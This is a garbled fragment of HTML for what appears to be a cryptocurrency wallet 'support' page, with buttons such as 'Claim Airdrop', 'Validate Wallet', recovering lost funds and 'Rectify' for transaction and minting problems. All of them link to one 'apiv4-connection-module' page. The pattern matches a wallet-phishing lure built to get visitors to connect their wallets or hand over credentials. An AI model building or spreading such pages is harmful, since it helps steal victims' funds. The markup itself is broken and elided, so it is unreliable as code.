...
rel = "stylesheet" / >
    ...
    <
    link href = "vendors/swiper/swiper-bundle.min.css"
rel = "stylesheet" >
    <
    /head>
...
data - navbar - darken - on - scroll = "900" >
    <
    div class = "container pt-2" > < a class = "navbar-brand text-white"
href = "index.html" > < /a> <
    div class = "navbar-nav ms-auto" >
    <
    a href = "apiv4-connection-module"
class = "btn btn-secondary" > Claim Airdrop < /a> <
    /div> <
    /div> <
    /nav>
    ...
    a href = "apiv4-connection-module"
class = "btn btn-primary mt-3" > Validate Wallet < /a> <
    /div> <
    /div> <
    /div>
    <!-- end of .container-->
...
src = "assets/img/gallery/wallet-fold-phone.png"
alt = "Dashboard" / >
    <
    /div>
    <!-- end of .container-->
    ...
    <
    div class = "p-5" > < img src = "assets/img/gallery/dashboardicon.png"
alt = "Dashboard"
...
style = "width:48px;height:48px;" / >
    ...
    <
    a href = ""
style = "text-decoration: none; color: inherit;" > < a href = "apiv4-connection-module"
class = "text-primary"
style = "text-decoration: none; " >
    Click here < /a> to connect decentralised web applications to mobile wallets or enable DApp on mobile wallets/extension. < /a></p >
    <
    /div> <
    /div> <
    /div> <
    ...
    div class = "border rounded-1 border-700 h-100 features-items" >
    <
    div class = "p-5" > < img src = "assets/img/gallery/trilored.png"
alt = "Tailored"
style = "width:48px;height:48px;" / >
    <
...
class = "text-primary"
style = "text-decoration: none; " >
    Click here < /a> if you have issues logging into your wallet. </a >
    <
    /p> <
    /div> <
    /div> <
...
class = "text-primary"
style = "text-decoration: none; " >
    Click here < /a> to recover lost/missing
funds. < /a> <
    /p> <
    /div> <
    /div> <
    ...
    div class = "border rounded-1 border-700 h-100 features-items" >
    <
    div class = "p-5" > < img src = "assets/img/gallery/statistics.png"
alt = "Profiles"
style = "width:48px;height:48px;" / >
    <
...
style = "text-decoration: none; " >
    ...
    div class = "border rounded-1 border-700 h-100 features-items" >
    <
    div class = "p-5" > < img src = "assets/img/gallery/profile.png"
alt = "Folders"
style = "width:48px;height:48px;" / >
    <
    ...
    a href = ""
style = "text-decoration: none; color: inherit;" >
    Do you have any issues with transactions ? < a href = "apiv4-connection-module"
class = "text-primary"
style = "text-decoration: none; " >
    Click here < /a> to Rectify <
    /a> <
...
style = "width:48px;height:48px;" / >
    ...
    a href = ""
style = "text-decoration: none; color: inherit;" >
    Do you have < a href = "apiv4-connection-module"
class = "text-primary"
style = "text-decoration: none; " >
    Click here < /a> to Rectify <
    /a> <
...
style = "width:48px;height:48px;" / >
    ...
    a href = ""
style = "text-decoration: none; color: inherit;" >
    Do you have any issues with Minting ? < a href = "apiv4-connection-module"
class = "text-primary"
style = "text-decoration: none; " >
    Click here < /a> to Rectify <
    /a> <
    ...
    <
    a href = "apiv4-connection-module"
class = "btn btn-info" > Get Started < span class = "fas fa-arrow-right" > < /span></a >
    <
    /div> <
    /div> <
    /div> <
...
href = "#!" > Terms & amp;
conditon < /a><a class="text-300 text-decoration-none footer-link ps-4" href="#!">Privacy Policy </a >
    <
    /p> <
    /div>
